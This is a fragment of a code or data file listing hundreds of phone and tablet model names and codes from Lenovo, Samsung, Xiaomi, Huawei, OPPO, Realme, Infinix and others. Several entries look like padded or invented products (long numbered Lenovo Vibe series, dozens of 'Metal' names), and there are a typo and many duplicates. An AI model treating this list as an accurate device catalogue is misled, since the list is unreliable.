        'Lenovo Vibe Z6 Pro',
        'Lenovo Vibe Z7',
        'Lenovo Vibe Z8',
        'Lenovo Vibe Z8 Plus',
        'Lenovo Vibe Z9',
        'Lenovo Vibe Z10',
        'Lenovo Vibe Z11',
        'Lenovo Vibe Z12',
        'Lenovo Vibe X5',
        'Lenovo Vibe X6',
        'Lenovo Vibe X7',
        'Lenovo Vibe X8',
        'Lenovo Vibe X9',
        'Lenovo Vibe X10',
        'Lenovo Vibe X11',
        'Lenovo Vibe X12',
        'Lenovo Vibe S5',
        'Lenovo Vibe S6',
        'Lenovo Vibe S7',
        'Lenovo Vibe S8',
        'Lenovo Vibe S9',
        'Lenovo Vibe S10',
        'Lenovo Vibe S11',
        'Lenovo Vibe S12',
        'Lenovo Vibe Note 5',
        'Lenovo Vibe Note 6',
        'Lenovo Vibe Note 7',
        'Lenovo Vibe Note 8',
        'Lenovo Vibe Note 9',
        'Lenovo Vibe Note 10',
        'Lenovo Vibe Note 11',
        'Lenovo Vibe Note 12',
        'Lenovo K5 Play',
        'Lenovo K6 Note',
        'Lenovo K8 Note',
        'Lenovo K10 Note',
        'Lenovo K11 Note',
        'Lenovo K12 Note',
        'Lenovo Z5 Pro',
        'Lenovo Z6 Pro',
        'Lenovo Z7 Pro',
        'Lenovo Z8 Pro',
        'Lenovo Z9 Pro',
        'Leneno Z10 Pro',
        'Lenovo Z11 Pro',
        'Lenovo Z12 Pro',
        'Lenovo A5',
        'Lenovo A6',
        'Lenovo A7',
        'Lenovo A8',
        'Lenovo A9',
        'Lenovo A10',
        'Lenovo A11',
        'Lenovo A12',
        'Lenovo Tab 2',
        'Lenovo Tab 3',
        'Lenovo Tab 4',
        'Lenovo Tab 5',
        'Lenovo Tab 6',
        'Lenovo Tab 7',
        'Lenovo Tab 8',
        'Lenovo Tab 9',
        'Lenovo Tab 10',
        'Lenovo Tab 11',
        'Lenovo Tab 12',
        'Lenovo Yoga Tab 2',
        'Lenovo Yoga Tab 3',
        'Lenovo Yoga Tab 4',
        'Lenovo Yoga Tab 5',
        'Lenovo Yoga Tab 6',
        'Lenovo Yoga Tab 7',
        'Lenovo Yoga Tab 8',
        'Lenovo Yoga Tab 9',
        'Lenovo Yoga Tab 10',
        'Lenovo Yoga Tab 11',
        'Lenovo Yoga Tab 12',
        'Metal X1',
        'Metal Pro',
        'Metal Ultra',
        'Metal Max',
        'Metal Lite',
        'Metal Plus',
        'Metal S',
        'Metal Power',
        'Metal Note',
        'Metal 5G',
        'Metal X',
        'Metal Beam',
        'Metal Flex',
        'Metal Ace',
        'Metal View',
        'Metal Elite',
        'Metal Neo',
        'Metal Style',
        'Metal Star',
        'Metal Master',
        'Metal Zoom',
        'Metal Focus',
        'Metal Maxx',
        'Metal X2',
        'Metal Blade',
        'Metal Edge',
        'Metal Zoomer',
        'Metal Fusion',
        'Metal Nexus',
        'Metal Solo',
        'Metal Squad',
        'Metal Sonic',
        'Metal Wave',
        'Metal Flash',
        'Metal Spark',
        'Metal Thunder',
        'Metal Blade X',
        'Metal Curve',
        'Metal Force',
        'Metal Speed',
        'Metal Vista',
        'Metal Horizon',
        'Metal Sky',
        'Metal Dream',
        'Metal Quest',
        'Metal Nova',
        'Metal Shift',
        'Metal Wave X',
        'Metal Harmony',
        'Metal Point',
        'Metal Craft',
        'Metal Swift',
        'Metal Storm',
        'Metal Nexus X',
        'Metal Vision',
        'Metal Zoom X',
        'Metal Blaze',
        'Metal Connect',
        'Metal Evo',
        'Metal Legacy',
        'Metal Express',
        'Metal Prime',
        'Metal Style X',
        'Metal Splendor',
        'Metal Pulse',
        'Metal Vertex',
        'Metal Tide',
        'Metal Spirit',
        'Metal Zoom Pro',
        'Metal Impact',
        'Metal Note Pro',
        'Metal Magic',
        'Metal Max Pro',
        'Metal Radiance',
        'Metal Sparkle',
        'Metal Pixel',
        'Metal Speed X',
        'Metal Quest Pro',
        'Metal Max Ultra',
        'Metal Vision X',
        'Metal Light',
        'Metal Echo',
        'Metal Streak',
        'Metal Titan',
        'Metal Legacy X',
        'Metal Dream Pro',
        'Metal Voyager',
        'Metal Zoom Max',
        'Metal Ultra Pro',
        'Metal Elite X',
        'Metal Edge Plus',
        'Metal Spark Ultra',
        'Metal Quest Max',
        'Metal X Pro',
        'Metal Prime Plus',
        'Metal Note Ultra',
        'Metal Zoom Elite',
        'Metal Max Flex',
        'Galaxy S21',
        'Galaxy S21+',
        'Galaxy S21 Ultra',
        'Galaxy S20',
        'Galaxy S20+',
        'Galaxy S20 Ultra',
        'Galaxy Note 20',
        'Galaxy Note 20 Ultra',
        'Galaxy S10',
        'Galaxy S10+',
        'Galaxy S10e',
        'Galaxy Note 10',
        'Galaxy Note 10+',
        'Galaxy S9',
        'Galaxy S9+',
        'Galaxy Note 9',
        'Galaxy S8',
        'Galaxy S8+',
        'Galaxy Note 8',
        'Galaxy S7',
        'Galaxy S7 Edge',
        'Galaxy Note 7',
        'Galaxy S6',
        'Galaxy S6 Edge',
        'Galaxy S6 Edge+',
        'Galaxy Note 5',
        'Galaxy S5',
        'Galaxy S5 mini',
        'Galaxy Note 4',
        'Galaxy Note Edge',
        'Galaxy Alpha',
        'Galaxy A90',
        'Galaxy A80',
        'Galaxy A70',
        'Galaxy A60',
        'Galaxy A50',
        'Galaxy A40',
        'Galaxy A30',
        'Galaxy A20',
        'Galaxy A10',
        'Galaxy A9',
        'Galaxy A8',
        'Galaxy A6',
        'Galaxy A5',
        'Galaxy A3',
        'Galaxy J7',
        'Galaxy J6',
        'Galaxy J5',
        'Galaxy J4',
        'Galaxy J3',
        'Galaxy J2',
        'Galaxy J1',
        'Galaxy M31',
        'Galaxy M30',
        'Galaxy M20',
        'Galaxy M10',
        'Galaxy Xcover Pro',
        'Galaxy Xcover 4s',
        'Galaxy Xcover 4',
        'Galaxy Beam 2',
        'Galaxy Tab S7+',
        'Galaxy Tab S7',
        'Galaxy Tab S6',
        'Galaxy Tab S5e',
        'Galaxy Tab A 10.5',
        'Galaxy Tab A 8.0',
        'Galaxy Tab Active 2',
        'Galaxy Tab Active Pro',
        'Galaxy Tab E',
        'Galaxy Tab S4',
        'Galaxy Tab S3',
        'Galaxy Tab S2',
        'Galaxy Tab S',
        'Galaxy Tab Pro',
        'Galaxy Tab 4',
        'Galaxy Tab 3',
        'Galaxy Tab 2',
        'Galaxy Watch 3',
        'Galaxy Watch',
        'Galaxy Watch Active 2',
        'Galaxy Watch Active',
        'Galaxy Watch 4',
        'Galaxy Fit 2',
        'Galaxy Fit',
        'Galaxy Buds Pro',
        'Galaxy Buds Live',
        'Galaxy Buds+',
        'Galaxy Buds',
        'Galaxy Note 20',
        'Galaxy Note 20 Ultra',
        'Galaxy Z Fold 2',
        'Galaxy Z Flip',
        'Galaxy Fold',
        'HM Note 8',
        'HM Note 9',
        'HM Note 10',
        'HM 8A',
        'HM 9A',
        'HM 10A',
        'HM Lite 7',
        'HM Lite 8',
        'HM Lite 9',
        'HM Pro 10',
        'HM 10T',
        'HM 10X',
        'HM 9T',
        'HM 9SE',
        'HM Mix 3',
        'HM Max 3',
        'HM Play',
        'HM 11 Lite',
        'HM 11 Pro',
        'HM CC9',
        'HM CC9 Pro',
        'HM 8SE',
        'HM 9 Pro',
        'HM X7',
        'HM A3',
        'HM A2',
        'HM A2 Lite',
        'HM A1',
        'HM 10 Youth',
        'HM 4X',
        'HM 4A',
        'HM 5A',
        'HM 6',
        'HM 6A',
        'HM 7',
        'HM 7A',
        'HM 8',
        'HM 8A',
        'HM 8 Pro',
        'HM 9',
        'HM 9 Pro',
        'HM 9 SE',
        'HM 9A',
        'HM 9T',
        'HM 10',
        'HM 10 Pro',
        'HM 10T',
        'HM 10T Pro',
        'HM 10T Lite',
        'HM 10X Pro',
        'HM 10X 5G',
        'HM Note 7',
        'HM Note 8',
        'HM Note 9',
        'HM Note 10',
        'HM Note 10 Pro',
        'HM Note 10 Pro Max',
        'HM Note 11',
        'HM Note 11 Pro',
        'HM Note 11 Pro+',
        'HM Note 11S',
        'HM Note 9 Pro',
        'HM Note 9 Pro Max',
        'HM Note 9S',
        'HM Note 7 Pro',
        'HM Note 7S',
        'HM Note 5',
        'HM Note 7 Plus',
        'HM Note 6',
        'HM Note 6 Pro',
        'HM Note 5 Pro',
        'HM Note 5A',
        'HM Note 4',
        'HM Note 4X',
        'HM Note 3',
        'HM Note 2',
        'HM Note 2X',
        'Mi 11 Ultra',
        'Mi 11 Pro',
        'Mi 11',
        'Mi 10T Pro',
        'Mi 10T',
        'Mi 10T Lite',
        'Mi 10 Pro',
        'Mi 10',
        'Mi 10 Lite',
        'Mi 9',
        'Mi 9T',
        'Mi 9 SE',
        'Mi Note 10',
        'Mi Note 10 Pro',
        'Mi Note 10 Lite',
        'Mi 9 Pro',
        'Mi 9 Explorer Edition',
        'Mi 8',
        'Mi 8 Pro',
        'Mi 8 Lite',
        'Mi 8 SE',
        'Mi Mix 3',
        'Mi Mix 3 5G',
        'Mi Mix 2S',
        'Mi Mix 2',
        'Mi Max 3',
        'Mi Max 2',
        'Mi Max',
        'Mi A3',
        'Mi A2',
        'Mi A2 Lite',
        'Mi A1',
        'Mi Play',
        'Mi 11 Lite',
        'Mi 11 Lite 5G',
        'Mi 10i',
        'Mi 10 Youth',
        'Mi 10 Ultra',
        'Mi 10X',
        'Mi 10X Pro',
        'Mi 10 Extreme Commemorative Edition',
        'Mi CC9',
        'Mi CC9 Pro',
        'Mi CC9e',
        'Mi CC9 Meitu Edition',
        'Mi CC9e Meitu Edition',
        'Advan S5E',
        'Advan S4P',
        'Advan i5C',
        'Advan Barca',
        'Advan E1C',
        'Advan S4A',
        'Advan G1',
        'Advan S3A',
        'Advan S35D',
        'Advan Vandroid',
        'Advan S5I',
        'Advan S50D',
        'Advan Vandroid S5K',
        'Advan Star Fit S45C',
        'Advan S4C',
        'Advan S4E',
        'Advan S4C Plus',
        'Advan Vandroid S4A',
        'Advan S40',
        'Advan S50H',
        'Advan S5K',
        'Advan S4A+',
        'Advan S5J',
        'Advan S3D',
        'Advan S50C',
        'Advan S35H',
        'Advan S4L',
        'Advan S5M',
        'Advan S7',
        'Advan i45',
        'Advan S3',
        'Advan Star 5',
        'Advan Star 5.3',
        'Advan S35D Plus',
        'Advan S3 Pro',
        'Advan S4',
        'Advan S5M+',
        'Advan S50F',
        'Advan Vandroid T5J',
        'Advan S5X',
        'Advan S4J',
        'Advan S35E',
        'Advan E1B',
        'Advan S35E Star',
        'Advan S35F',
        'Advan S5G',
        'Advan S5',
        'Advan S4Z',
        'Advan Vandroid S4B',
        'Advan S50D ANDROID ONE',
        'Advan S3L',
        'Advan Vandroid S4X',
        'Advan Vandroid Alpha X5',
        'Advan Vandroid S4F',
        'Advan Vandroid T1E',
        'Advan Vandroid T2E',
        'Advan Vandroid T5-A',
        'Advan Vandroid S3C',
        'Advan S6C',
        'Advan Vandroid T3X',
        'Advan Vandroid S5G',
        'Advan Vandroid X7',
        'Advan Vandroid S6A',
        'Advan Vandroid GAIA',
        'Advan Vandroid T4',
        'Advan Vandroid T3C',
        'Advan Vandroid T1X',
        'Advan CERIA',
        'Advan S3 Plus',
        'Advan S55',
        'Advan S4B',
        'Advan Star Fit',
        'Advan S4C SPEC PRO',
        'Advan Vandroid Q7A',
        'Advan Star Note',
        'Advan Star 5.5 PLUS',
        'Advan Vandroid T1B',
        'Advan i4A',
        'Advan Star X',
        'Advan Vandroid T5C',
        'Advan Vandroid T1',
        'Advan Vandroid 01A',
        'Advan C1',
        'Advan S7 PLUS',
        'Advan Vandroid S4X+',
        'Advan Star Paint E1C',
        'Advan S5F',
        'Advan Vandroid S4J',
        'Advan Vandroid S5M',
        'Advan Vandroid T4i',
        'Advan Star 6',
        'Redmi 9A',
        'Redmi 9C',
        'Redmi 9T',
        'Redmi 10',
        'Redmi 10 Prime',
        'Redmi Note 10',
        'Redmi Note 10S',
        'Redmi Note 10 Pro',
        'Redmi Note 10 Pro Max',
        'Redmi Note 11',
        'Redmi Note 11 Pro',
        'Redmi Note 11 Pro+',
        'Redmi 9',
        'Redmi 9 Prime',
        'Redmi 9 Power',
        'Redmi 9C NFC',
        'Redmi 9 Activ',
        'Redmi 8A',
        'Redmi 8A Dual',
        'Redmi 8',
        'Redmi 9i',
        'Redmi 9 (India)',
        'Redmi 9 (Global)',
        'Redmi 10X',
        'Redmi 10X Pro',
        'Redmi K30',
        'Redmi K30 Pro',
        'Redmi K40',
        'Redmi K40 Pro',
        'Redmi K40 Pro+',
        'Redmi K30S Ultra',
        'Redmi K30 Ultra',
        'Redmi K30i 5G',
        'Redmi Note 8',
        'Redmi Note 8T',
        'Redmi Note 8 Pro',
        'Redmi Note 9',
        'Redmi Note 9 Pro',
        'Redmi Note 9 Pro Max',
        'Redmi Note 9S',
        'Redmi Note 8 2021',
        'Redmi Note 8 Pro 2021',
        'Redmi Note 7',
        'Redmi Note 7 Pro',
        'Redmi Note 7S',
        'Redmi Note 6',
        'Redmi Note 6 Pro',
        'Redmi Note 5',
        'Redmi Note 5 Pro',
        'Redmi Note 5A',
        'Redmi 7',
        'Redmi 7A',
        'Redmi 7 (China)',
        'Redmi 6',
        'Redmi 6A',
        'Redmi 6 Pro',
        'Redmi Y3',
        'Redmi Y2',
        'Redmi Y1',
        'Redmi Y1 Lite',
        'Redmi Y',
        'Redmi S2',
        'Redmi 5',
        'Redmi 5A',
        'Redmi 5 Plus',
        'Redmi 5 Pro',
        'Redmi 5S',
        'Redmi 5S Plus',
        'Redmi 4',
        'Redmi 4A',
        'Redmi 4X',
        'Redmi 4 Pro',
        'Redmi 4 Prime',
        'Redmi 3',
        'Redmi 3S',
        'Redmi 3X',
        'Redmi 3 Pro',
        'Redmi 3 Prime',
        'Redmi 2',
        'Redmi 2A',
        'Redmi 2 Prime',
        'Redmi 1',
        'Huawei P50',
        'Huawei P50 Pro',
        'Huawei Mate 40',
        'Huawei Mate 40 Pro',
        'Huawei Mate 40 Pro+',
        'Huawei P40',
        'Huawei P40 Pro',
        'Huawei P40 Pro+',
        'Huawei Mate 30',
        'Huawei Mate 30 Pro',
        'Huawei Mate X',
        'Huawei Mate Xs',
        'Huawei P30',
        'Huawei P30 Pro',
        'Huawei P30 Lite',
        'Huawei Mate 20',
        'Huawei Mate 20 Pro',
        'Huawei Mate 20 X',
        'Huawei P20',
        'Huawei P20 Pro',
        'Huawei Nova 7',
        'Huawei Nova 7 Pro',
        'Huawei Nova 7 SE',
        'Huawei Nova 6',
        'Huawei Nova 6 SE',
        'Huawei Nova 5',
        'Huawei Nova 5T',
        'Huawei Nova 5Z',
        'Huawei Enjoy 20',
        'Huawei Enjoy 20 Pro',
        'Huawei Enjoy 20 Plus',
        'Huawei Y9 Prime',
        'Huawei Y9s',
        'Huawei Y7a',
        'Huawei Y8p',
        'Huawei Y6p',
        'Huawei Y5p',
        'Huawei P Smart',
        'Huawei P Smart Pro',
        'Huawei P Smart S',
        'Huawei Mate X2',
        'Huawei Mate 30E Pro',
        'Huawei Mate 40E',
        'Huawei Mate 40 RS Porsche Design',
        'Huawei Mate 20 RS Porsche Design',
        'Huawei Mate 10',
        'Huawei Mate 10 Pro',
        'Huawei Mate 9',
        'Huawei Mate 9 Pro',
        'Huawei P10',
        'Huawei P10 Plus',
        'Huawei P9',
        'Huawei P9 Plus',
        'Huawei Nova 4',
        'Huawei Nova 3',
        'Huawei Nova 3i',
        'Huawei Nova 2',
        'Huawei Nova 2i',
        'Huawei Enjoy 10',
        'Huawei Enjoy 10 Plus',
        'Huawei Enjoy 10E',
        'Huawei Y9',
        'Huawei Y7',
        'Huawei Y6',
        'Huawei Y5',
        'Huawei P Smart Z',
        'Huawei P Smart 2021',
        'Huawei P40 Lite',
        'Huawei P30 Lite New Edition',
        'Huawei Mate 40 Lite',
        'Huawei Mate 30 Lite',
        'Huawei Nova 7i',
        'Huawei Nova 6 SE',
        'Huawei Enjoy 9',
        'Huawei Y8s',
        'Huawei Y6s',
        'Huawei P Smart S',
        'Huawei P40 Lite E',
        'Huawei P30 Lite',
        'Huawei Mate 30E',
        'Huawei Mate 10 Porsche Design',
        'Huawei Mate 9 Porsche Design',
        'Huawei P20 Lite',
        'Huawei Psmart 2022',
        'Huawei P20 Lite',
        'Huawei P10 Lite',
        'Huawei P8 Lite',
        'Huawei Nova 2 Plus',
        'Huawei Nova Lite 3',
        'Huawei Nova 2S',
        'Huawei Enjoy 10S',
        'Huawei Y7p',
        'Huawei Y6 Prime 2019',
        'Huawei Y5 Lite',
        'Huawei Y3',
        'V2072A',
        'V2128A',
        'V2066A',
        'V2019A',
        'V2111A',
        'V2033A',
        'V2121A',
        'V2070A',
        'V2049A',
        'V2145A',
        'V2005A',
        'V2031A',
        'V2125A',
        'V2064A',
        'V2021A',
        'V2179A',
        'V2098A',
        'V2140A',
        'V2066A',
        'V2055A',
        'V2011A',
        'V2125A',
        'V2141A',
        'V2061A',
        'V2159A',
        'V2073A',
        'V2175A',
        'V2037A',
        'V2067A',
        'V2154A',
        'V2129A',
        'V2083A',
        'V2145A',
        'V2031A',
        'V2064A',
        'V2152A',
        'V2091A',
        'V2143A',
        'V2077A',
        'V2027A',
        'V2118A',
        'V2037A',
        'V2139A',
        'V2166A',
        'V2086A',
        'V2122A',
        'V2170A',
        'V2044A',
        'V2119A',
        'V2062A',
        'V2174A',
        'V2035A',
        'V2132A',
        'V2096A',
        'V2151A',
        'V2108A',
        'V2075A',
        'V2167A',
        'V2053A',
        'V2126A',
        'V2045A',
        'V2094A',
        'V2142A',
        'V2012A',
        'V2105A',
        'V2177A',
        'V2069A',
        'V2153A',
        'V2088A',
        'V2071A',
        'V2136A',
        'V2102A',
        'V2180A',
        'V2026A',
        'V2113A',
        'V2039A',
        'V2149A',
        'V2092A',
        'V2156A',
        'V2079A',
        'V2017A',
        'V2176A',
        'V2058A',
        'V2080A',
        'V2144A',
        'V2021A',
        'V2130A',
        'V2068A',
        'V2124A',
        'V2046A',
        'V2095A',
        'V2150A',
        'V2110A',
        'V2082A',
        'V2138A',
        'V2101A',
        'CPH2185',
        'CPH1941',
        'CPH1729',
        'CPH1717',
        'CPH1923',
        'CPH1859',
        'CPH2015',
        'CPH1909',
        'CPH1937',
        'CPH2061',
        'CPH2001',
        'CPH1823',
        'CPH1837',
        'CPH1979',
        'CPH2083',
        'CPH2109',
        'CPH2063',
        'CPH2041',
        'CPH2017',
        'CPH1977',
        'CPH2195',
        'CPH2067',
        'CPH1939',
        'CPH1989',
        'CPH2113',
        'CPH2069',
        'CPH1835',
        'CPH2025',
        'CPH2031',
        'CPH2073',
        'CPH2053',
        'CPH1905',
        'CPH1943',
        'CPH1925',
        'CPH2019',
        'CPH1971',
        'CPH1843',
        'CPH1831',
        'CPH2095',
        'CPH2065',
        'CPH1821',
        'CPH1911',
        'CPH2005',
        'CPH1933',
        'CPH2127',
        'CPH2077',
        'CPH2189',
        'CPH2051',
        'CPH2159',
        'CPH1893',
        'CPH1947',
        'CPH1981',
        'CPH2135',
        'CPH2091',
        'CPH1935',
        'CPH2117',
        'CPH2043',
        'CPH2161',
        'CPH1841',
        'CPH1861',
        'CPH2121',
        'CPH1929',
        'CPH2021',
        'CPH2009',
        'CPH2199',
        'CPH2151',
        'CPH2089',
        'CPH2069',
        'CPH2011',
        'CPH2071',
        'CPH2023',
        'CPH2049',
        'CPH1985',
        'CPH2145',
        'CPH2103',
        'CPH2099',
        'CPH2055',
        'CPH2131',
        'CPH2111',
        'CPH1987',
        'CPH1969',
        'CPH2163',
        'CPH2123',
        'CPH2007',
        'CPH1913',
        'CPH1899',
        'CPH1959',
        'CPH1927',
        'CPH1883',
        'CPH1877',
        'CPH2027',
        'CPH2013',
        'CPH1839',
        'CPH1827',
        'CPH1963',
        'CPH2125',
        'CPH2157',
        'CPH2093',
        'CPH2075',
        'CPH2059',
        'OPPO R7sm',
        'OD105',
        'vivo X7Plus',
        'OPPO R9 Plusm A',
        'OPPO R7s',
        'HM 2A',
        '8848 M3',
        'HUAWEI VNS-TL00',
        'MI NOTE LTE',
        'NX403A',
        'T1-823L',
        'NX523J_V1',
        'XT1085',
        'DUK-AL20',
        'metal',
        'PBDM00',
        'OPPO A59s',
        'HUAWEI B199',
        'CAM-TL00H',
        'Redmi Note 5',
        'HUAWEI RIO-TL00',
        'SM-G900FQ',
        'Andromax B16C2G',
        'Lenovo A850',
        'thl T6 pro',
        'Orange Hiro',
        'Desire S',
        'P780C',
        'S4E',
        'Lenovo S850',
        'Oysters T7V 3G',
        'ADVAN S3',
        'M9',
        'miTab BROOKLYN',
        'Lumia 1020',
        'LG-E425',
        'LG-VS410PP',
        'H866C',
        'U8510',
        'USM-A105F8800Pro',
        'Redmi S2',
        'GT-I9001',
        'Infinix Hot 10',
        'Infinix X688B',
        'Infinix X682B',
        'Infinix X658E',
        'Infinix PR652B',
        'Infinix X659B',
        'Infinix X689',
        'Infinix X689D',
        'Infinix X662',
        'Infinix X676B',
        'Infinix X687',
        'Infinix X609',
        'Infinix X697',
        'Infinix X680D',
        'Infinix X507',
        'Infinix X605',
        'Infinix X668',
        'Infinix X6815B',
        'Infinix X624',
        'Infinix X655F',
        'Infinix X689C',
        'Infinix X608',
        'Infinix X698',
        'Infinix X682C',
        'Infinix X688C',
        'Infinix X689B',
        'Infinix X689',
        'Infinix X689D',
        'Infinix X662',
        'Infinix X662B',
        'Infinix X675',
        'Infinix X6812B',
        'Infinix X6812',
        'Infinix X6817B',
        'Infinix X6817',
        'Infinix X6816C',
        'Infinix X6816',
        'Infinix X6816D',
        'Infinix X668C',
        'Infinix X665B',
        'Infinix X665E',
        'Infinix X510',
        'Infinix X559C',
        'Infinix X559F',
        'Infinix X559',
        'Infinix X606',
        'Infinix X606C',
        'Infinix X606D',
        'Infinix X623',
        'Infinix X624B',
        'Infinix X625C',
        'Infinix X625D',
        'Infinix X625B',
        'Infinix X650D',
        'Infinix X650B',
        'Infinix X650',
        'Infinix X650C',
        'Infinix X655C',
        'Infinix X655D',
        'Infinix X680B',
        'Infinix X573',
        'Infinix X573B',
        'Infinix X622',
        'Infinix X693',
        'Infinix X695C',
        'Infinix X695D',
        'Infinix X695',
        'Infinix X663B',
        'Infinix X663',
        'Infinix X670',
        'Infinix X671',
        'Infinix X671B',
        'Infinix X672',
        'Infinix X6819',
        'Infinix X572',
        'Infinix X572-LTE',
        'Infinix X571',
        'Infinix X604',
        'Infinix X610B',
        'Infinix X690',
        'Infinix X690B',
        'Infinix X656',
        'Infinix X692',
        'Infinix X683',
        'Infinix X450',
        'Infinix X5010',
        'Infinix X501',
        'Infinix X401',
        'Infinix X626',
        'Infinix X626B',
        'Infinix X652',
        'Infinix X652A',
        'Infinix X652B',
        'Infinix X652C',
        'Infinix X660B',
        'Infinix X660C',
        'Infinix X660',
        'Infinix X5515',
        'Infinix X5515F',
        'Infinix X5515I',
        'Infinix X609B',
        'Infinix X5514D',
        'Infinix X5516B',
        'Infinix X5516C',
        'Infinix X627',
        'Infinix X680',
        'Infinix X653',
        'Infinix X653C',
        'Infinix X657',
        'Infinix X657B',
        'Infinix X657C',
        'Infinix X6511B',
        'Infinix X6511E',
        'Infinix X6511',
        'Infinix X6512',
        'Infinix X6823C',
        'Infinix X612B',
        'Infinix X612',
        'Infinix X503',
        'Infinix X511',
        'Infinix X352',
        'Infinix X351',
        'Infinix X530',
        'Infinix X676C',
        'Infinix X6821',
        'Infinix X6823',
        'Infinix X6827',
        'Infinix X509',
        'Infinix X603',
        'Infinix X6815',
        'Infinix X620B',
        'Infinix X620',
        'Infinix X687B',
        'Infinix X6811B',
        'Infinix X6810',
        'Infinix X6811',
        'CPH1869',
        'CPH1929',
        'CPH2107',
        'CPH2238',
        'CPH2389',
        'CPH2401',
        'CPH2407',
        'CPH2413',
        'CPH2415',
        'CPH2417',
        'CPH2419',
        'CPH2455',
        'CPH2459',
        'CPH2461',
        'CPH2471',
        'CPH2473',
        'CPH2477',
        'CPH8893',
        'CPH2321',
        'CPH2341',
        'CPH2373',
        'CPH2083',
        'CPH2071',
        'CPH2077',
        'CPH2185',
        'CPH2179',
        'CPH2269',
        'CPH2421',
        'CPH2349',
        'CPH2271',
        'CPH1923',
        'CPH1925',
        'CPH1837',
        'CPH2015',
        'CPH2073',
        'CPH2081',
        'CPH2029',
        'CPH2031',
        'CPH2137',
        'CPH1605',
        'CPH1803',
        'CPH1853',
        'CPH1805',
        'CPH1809',
        'CPH1851',
        'CPH1931',
        'CPH1959',
        'CPH1933',
        'CPH1935',
        'CPH1943',
        'CPH2061',
        'CPH2069',
        'CPH2127',
        'CPH2131',
        'CPH2139',
        'CPH2135',
        'CPH2239',
        'CPH2195',
        'CPH2273',
        'CPH2325',
        'CPH2309',
        'CPH1701',
        'CPH2387',
        'CPH1909',
        'CPH1920',
        'CPH1912',
        'CPH1901',
        'CPH1903',
        'CPH1905',
        'CPH1717',
        'CPH1801',
        'CPH2067',
        'CPH2099',
        'CPH2161',
        'CPH2219',
        'CPH2197',
        'CPH2263',
        'CPH2375',
        'CPH2339',
        'CPH1715',
        'CPH2385',
        'CPH1729',
        'CPH1827',
        'CPH1938',
        'CPH1937',
        'CPH1939',
        'CPH1941',
        'CPH2001',
        'CPH2021',
        'CPH2059',
        'CPH2121',
        'CPH2123',
        'CPH2203',
        'CPH2333',
        'CPH2365',
        'CPH1913',
        'CPH1911',
        'CPH1915',
        'CPH1969',
        'CPH2209',
        'CPH1987',
        'CPH2095',
        'CPH2119',
        'CPH2285',
        'CPH2213',
        'CPH2223',
        'CPH2363',
        'CPH1609',
        'CPH1613',
        'CPH1723',
        'CPH1727',
        'CPH1725',
        'CPH1819',
        'CPH1821',
        'CPH1825',
        'CPH1881',
        'CPH1823',
        'CPH1871',
        'CPH1875',
        'CPH2023',
        'CPH2005',
        'CPH2025',
        'CPH2207',
        'CPH2173',
        'CPH2307',
        'CPH2305',
        'CPH2337',
        'CPH1955',
        'CPH1707',
        'CPH1719',
        'CPH1721',
        'CPH1835',
        'CPH1831',
        'CPH1833',
        'CPH1879',
        'CPH1893',
        'CPH1877',
        'CPH1607',
        'CPH1611',
        'CPH1917',
        'CPH1919',
        'CPH1907',
        'CPH1989',
        'CPH1945',
        'CPH1951',
        'CPH2043',
        'CPH2035',
        'CPH2037',
        'CPH2036',
        'CPH2009',
        'CPH2013',
        'CPH2113',
        'CPH2091',
        'CPH2125',
        'CPH2109',
        'CPH2089',
        'CPH2065',
        'CPH2159',
        'CPH2145',
        'CPH2205',
        'CPH2201',
        'CPH2199',
        'CPH2217',
        'CPH1921',
        'CPH2211',
        'CPH2235',
        'CPH2251',
        'CPH2249',
        'CPH2247',
        'CPH2237',
        'CPH2371',
        'CPH2293',
        'CPH2353',
        'CPH2343',
        'CPH2359',
        'CPH2357',
        'CPH2457',
        'CPH1983',
        'CPH1979',
        'oppo f 5 plus',
        'OPPO F1',
        'OPPO F1 Plus',
        'PEPM00',
        'PEDM00',
        'PCHM10',
        'PCLM10',
        'PCCM00',
        'PDBM00',
        'OPPO PBBM30',
        'OPPO A31',
        'OPPO F1s',
        'A31',
        'OPPO R11s',
        'OPPO A37m',
        'RMX3686',
        'RMX3393',
        'RMX3081',
        'RMX2170',
        'RMX2061',
        'RMX2020',
        'RMX3516',
        'RMX3371',
        'RMX3461',
        'RMX3286',
        'RMX3561',
        'RMX3388',
        'RMX3311',
        'RMX3142',
        'RMX2071',
        'RMX1805',
        'RMX1809',
        'RMX1801',
        'RMX1807',
        'RMX1803',
        'RMX1825',
        'RMX1821',
        'RMX1822',
        'RMX1833',
        'RMX1851',
        'RMX1853',
        'RMX1827',
        'RMX1911',
        'RMX1919',
        'RMX1927',
        'RMX1971',
        'RMX1973',
        'RMX2030',
        'RMX2032',
        'RMX1925',
        'RMX1929',
        'RMX2001',
        'RMX2061',
        'RMX2063',
        'RMX2040',
        'RMX2042',
        'RMX2002',
        'RMX2151',
        'RMX2163',
        'RMX2155',
        'RMX2170',
        'RMX2103',
        'RMX3085',
        'RMX3241',
        'RMX3081',
        'RMX3151',
        'RMX3381',
        'RMX3521',
        'RMX3474',
        'RMX3471',
        'RMX3472',
        'RMX3392',
        'RMX3393',
        'RMX3491',
        'RMX1811',
        'RMX2185',
        'RMX3231',
        'RMX2189',
        'RMX2180',
        'RMX2195',
        'RMX2101',
        'RMX1941',
        'RMX1945',
        'RMX3063',
        'RMX3061',
        'RMX3201',
        'RMX3203',
        'RMX3261',
        'RMX3263',
        'RMX3193',
        'RMX3191',
        'RMX3195',
        'RMX3197',
        'RMX3265',
        'RMX3268',
        'RMX3269',
        'RMX2027',
        'RMX2020',
        'RMX2021',
        'RMX3581',
        'RMX3501',
        'RMX3503',
        'RMX3511',
        'RMX3310',
        'RMX3312',
        'RMX3551',
        'RMX3301',
        'RMX3300',
        'RMX2202',
        'RMX3363',
        'RMX3360',
        'RMX3366',
        'RMX3361',
        'RMX3031',
        'RMX3370',
        'RMX3357',
        'RMX3560',
        'RMX3562',
        'RMX3350',
        'RMX2193',
        'RMX2161',
        'RMX2050',
        'RMX2156',
        'RMX3242',
        'RMX3171',
        'RMX3430',
        'RMX3235',
        'RMX3506',
        'RMX2117',
        'RMX2173',
        'RMX3161',
        'RMX2205',
        'RMX3462',
        'RMX3478',
        'RMX3372',
        'RMX3574',
        'RMX1831',
        'RMX3121',
        'RMX3122',
        'RMX3125',
        'RMX3043',
        'RMX3042',
        'RMX3041',
        'RMX3092',
        'RMX3093',
        'RMX3571',
        'RMX3475',
        'RMX2200',
        'RMX2201',
        'RMX2111',
        'RMX2112',
        'RMX1901',
        'RMX1903',
        'RMX1992',
        'RMX1993',
        'RMX1991',
        'RMX1931',
        'RMX2142',
        'RMX2081',
        'RMX2085',
        'RMX2083',
        'RMX2086',
